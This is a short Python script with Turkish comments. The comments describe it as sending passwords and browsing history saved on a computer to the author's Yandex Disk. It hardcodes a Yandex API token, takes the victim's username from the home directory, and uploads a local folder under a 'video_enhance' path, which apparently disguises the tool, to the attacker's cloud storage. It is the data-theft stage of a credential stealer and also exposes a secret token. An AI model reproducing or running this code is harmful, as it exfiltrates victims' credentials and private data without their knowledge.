import yadisk,os
#Bu fonksiyonla bilgisayara kaydettiğimiz şifre ve geçmiş verilerini yandexten oluşturduğumuz token ile yandex diskimize aktarıyoruz
def q4():
    #yandex diske bağlanmak için token verilerini giriyoruz
    y = yadisk. YaDisk(token="y0_AgAAAABoAeQQAAkE9AAAAADaE4t8XURAVEHHRVSy8EduiYwaxQG61sY")
    
    data_user_name=os.path.expanduser('~')[9:]
    data_txt_path = "C:\\Users\\Berat\\Desktop\\fadex\\video_enhance\\x\\s"
    #yandex diskte böyle bir dosya var mı? yok mu? kontrol ediyoruz ve basitçe upload metoduyla yüklüyoruz
    y.upload(data_txt_path,"/"+data_user_name+".txt")
    y.upload_directory(data_txt_path, 'app:/path/to/disk', overwrite=True)
q4()